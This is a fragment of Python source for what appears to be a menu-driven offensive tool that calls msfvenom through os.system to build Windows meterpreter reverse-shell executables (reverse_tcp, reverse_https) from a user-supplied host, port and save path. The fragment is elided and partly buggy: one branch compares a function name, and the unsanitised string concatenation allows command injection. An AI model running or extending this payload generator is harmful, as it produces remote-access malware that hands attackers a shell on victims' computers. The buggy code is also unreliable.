...
def savefile(contect):
    save_path = input(f"{Fore.WHITE}Do you want to save the result to a file? (Y/n): ")
    if save_path == "y" or save_path == "Y":
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        filename = f"aegis_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join(desktop,filename)
        with open (filepath,"w") as file:
            file.write(str(contect))
        print(f"{Fore.GREEN}Results saved to {filepath}")
    elif savefile == "n" or savefile == "N":
...
while True:
    ...
    if (selection == "1"):
        ...
        [3] windows/meterpreter/reverse__https       
        """)
        payload = input(f"{Fore.WHITE}Enter the payload number => ")
        savefilee= input("Enter the save path => ")
        if (payload == "1"):
            os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + savefilee)
    elif selection == "6":
        print(f"""{Fore.RED}
